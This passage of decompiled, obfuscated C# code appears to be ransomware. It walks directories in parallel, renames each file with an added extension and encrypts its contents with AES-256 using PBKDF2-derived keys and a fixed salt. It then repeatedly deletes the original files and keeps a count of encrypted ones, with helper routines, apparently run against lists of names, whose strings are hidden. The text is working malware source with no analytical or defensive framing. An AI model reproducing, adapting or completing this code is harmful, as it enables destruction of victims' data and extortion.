							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (QGAYpwMzxm == kFfBlUyayStE.getString_0(107397033))
							{
								byte[] array2 = null;
								byte[] byte_2 = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
								if (fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, TTsauZziAEbN: bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!IooTTsvIiwCN)
							{
								if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, text4, bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09e1;
						}
					}
					continue;
					IL_09e1:
					CS_0024_003C_003E8__locals0.WNvdcTPDgW.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.WNvdcTPDgW, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new kFfBlUyayStE.YUIjdATTEVIX();
			CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.PUDDzPYRoE = string_0;
			if (CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW.Length != 0)
			{
				string[] dXgeOiXUaNyFEW = CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW;
				int num = 0;
				while (num < dXgeOiXUaNyFEW.Length)
				{
					string value = dXgeOiXUaNyFEW[num];
					if (!CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(CS_0024_003C_003E8__locals0.ZDxRrpKTbd))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!yGkMwQPqUdXIj.Contains(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
			{
				if (cySCSfjuDKIn == kFfBlUyayStE.getString_0(107396873))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE));
				}
				VmNlRJHbsFKpwZ(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				try
				{
					new vyQYEsUfMyGoFM().rjhwntJsrm(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.PUDDzPYRoE, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(kFfBlUyayStE.getString_0(107403564) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107403519) + new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length + kFfBlUyayStE.getString_0(107403498));
								Console.WriteLine(kFfBlUyayStE.getString_0(107403489));
							}
						}
						catch
						{
						}
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(kFfBlUyayStE.getString_0(107403416)), kFfBlUyayStE.getString_0(107387760) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE.getString_0(107403871)) + kFfBlUyayStE.getString_0(107387760) + Environment.UserName + kFfBlUyayStE.getString_0(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE.getString_0(107403854)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107403861) + ex2.Message + kFfBlUyayStE.getString_0(107396306));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107403748) + ex4.Message + kFfBlUyayStE.getString_0(107396306));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_031d_2;
					}
					if (CdQMIPJOkrOUDSy == kFfBlUyayStE.getString_0(107396873) && new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
							{
								if (MiZHZrKmtKkaPXn)
								{
									CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
								}
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107403687) + ex6.Message + kFfBlUyayStE.getString_0(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
						{
							CS_0024_003C_003E8__locals0.PUDDzPYRoE += CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
						}
						if (bxhZXFvKXZl == kFfBlUyayStE.getString_0(107396873))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == kFfBlUyayStE.YUIjdATTEVIX.getString_0(107396879))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length)
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.YUIjdATTEVIX.getString_0(107389344), kFfBlUyayStE.YUIjdATTEVIX.getString_0(107389339), kFfBlUyayStE.YUIjdATTEVIX.getString_0(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item3) && vEWBFQaTPDgk == kFfBlUyayStE.YUIjdATTEVIX.getString_0(107397039))
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.YUIjdATTEVIX.getString_0(107389344), kFfBlUyayStE.YUIjdATTEVIX.getString_0(107389339), kFfBlUyayStE.YUIjdATTEVIX.getString_0(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s = FlpXYRWvTX.ZTvekdOmyg(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == kFfBlUyayStE.getString_0(107397033))
						{
							byte[] array = null;
							byte[] byte_ = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.PUDDzPYRoE, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (!fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.PUDDzPYRoE, TTsauZziAEbN: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MiZHZrKmtKkaPXn)
						{
							CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
						}
						string text2 = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s2 = FlpXYRWvTX.ZTvekdOmyg(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
						{
							if (!EcdpqbMrQOzfdgL)
							{
								if (!IooTTsvIiwCN)
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IooTTsvIiwCN)
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
									}
									else
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (joesCNAxeHUI)
									{
										try
										{
											File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107386220) + ex11.Message + kFfBlUyayStE.getString_0(107396306));
										}
										catch (Exception)
										{
										}
									}
									iePhSHBTqLd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107386773), lrVhqMPbYlaOK);
							}
							else
							{
								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107386773), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, lrVhqMPbYlaOK);
								}
								else
								{
									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE.getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE.getString_0(107386220) + ex14.Message + kFfBlUyayStE.getString_0(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								return;
							}
						}
						if (IooTTsvIiwCN)
						{
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE.getString_0(107386778))
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, bytes2);
							}
							else
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			CS_0024_003C_003E8__locals0.WNvdcTPDgW.Remove(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
		});
	}

	private static void BrOZVHevqxbaV(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (bxhZXFvKXZl == getString_0(107396855))
					{
						foreach (string item in EKjYgfCTgvyfhvOPx)
						{
							if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396855))
							{
								if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107397015))
							{
								try
								{
									GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386755)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386755), getString_0(107388695)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void IzvDPVDWsNMZj(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (bxhZXFvKXZl == getString_0(107396855))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396855))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107397015))
					{
						try
						{
							GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = RpWKlAyYXuFg.pUQagweWpoRi(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		XnicJWCgBOO++;
	}

	private static void GKkFnjoUAoXGqN(string string_0, string string_1, byte[] byte_0)
	{
		wVXqIBGGPLo CS_0024_003C_003E8__locals0 = new wVXqIBGGPLo();
		CS_0024_003C_003E8__locals0.atoCyWSfKSy = string_0;
		CS_0024_003C_003E8__locals0.fRxskrnPHhc = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string fRxskrnPHhc = CS_0024_003C_003E8__locals0.fRxskrnPHhc;
			FileStream fileStream = new FileStream(fRxskrnPHhc, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (POXokwFKrkkHxdVH == getString_0(107396855))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.fRxskrnPHhc.Length > 0)
				{
					if (bxhZXFvKXZl == getString_0(107396855))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in EKjYgfCTgvyfhvOPx)
						{
							if (CS_0024_003C_003E8__locals0.atoCyWSfKSy.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396855))
							{
								if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), CS_0024_003C_003E8__locals0.atoCyWSfKSy);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.atoCyWSfKSy.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107397015))
							{
								try
								{
									GyWbmViNanxKl.DGdOiIgzOMW(getString_0(107389320), getString_0(107389315), getString_0(107388758), CS_0024_003C_003E8__locals0.atoCyWSfKSy);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.atoCyWSfKSy);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.fRxskrnPHhc.EndsWith(getString_0(107386755)))
					{
						File.Move(CS_0024_003C_003E8__locals0.fRxskrnPHhc, CS_0024_003C_003E8__locals0.fRxskrnPHhc.Replace(getString_0(107386755), getString_0(107388695)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.fRxskrnPHhc))
							{
								File.Delete(CS_0024_003C_003E8__locals0.fRxskrnPHhc);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107386500) + CS_0024_003C_003E8__locals0.atoCyWSfKSy + getString_0(107386202) + ex2.Message + getString_0(107396288));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__8()
	{
		List<string> source = iSGwXCiIfXBR;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386181)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source2 = jFoYvbvoLRCagvDFmn;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386136)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		if (tMTGisYcNMVHo == getString_0(107396855))
		{
			string[] source3 = tPINiNFcqTnZtQ;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386136)), getString_0(107386143) + string_0 + getString_0(107386102));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		if (!PAhtGWwudbxozQK().Contains(getString_0(107386878)))
		{
			AiwyVzAQMcDi(AbUTAcXZWDez);
		}
		else
		{
			List<string> bSHtnNKwjXivMJS = BSHtnNKwjXivMJS;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
				{
					KXNiSRaxzeIpPt(GwTsezEgVAuVAU(VSGqbgWciAAQ(getString_0(107386097))), string_0);
				};
			}
			Parallel.ForEach(bSHtnNKwjXivMJS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		List<string> source4 = hkXnlfpoGpnf;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386072)), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386181)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386136)), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386136)), getString_0(107386143) + string_0 + getString_0(107386102));
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(VSGqbgWciAAQ(getString_0(107386097))), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386072)), string_0);
	}

	static PFruJiQrcriiZ()
	{
		Strings.CreateGetStringDelegate(typeof(PFruJiQrcriiZ));
		tTTuIqIyTVsKt = getString_0(107388594);
		lrVhqMPbYlaOK = null;
		kvJFoDYMuC = getString_0(107397015);
		cJvZgRMCiiT = getString_0(107386087);
		HoHveMjVjvX = new List<string>();
		YtNGHYTThvg = new List<string>();
		YsJopGaPpPETyH = getString_0(107397015);
		nyAmnOdcSzzfJ = getString_0(107388695);
		AFNtNBdAhEf = getString_0(107388695);
		zcPzHRZXYSoC = getString_0(107397015);
		PNgOzFQmoBxwkpD = 0;
		cySCSfjuDKIn = getString_0(107397015);
		mfIGHgxpUFhf = getString_0(107397015);
		vCBJiLpGmJSnD = getString_0(107397015);
		ARhmLIZgWToPak = getString_0(107386042);
		HUAsnTLTOzrk = getString_0(107397015);
		TaRSuIXzPFDe = getString_0(107397015);
		EBwCzzKShZJF = getString_0(107396855);
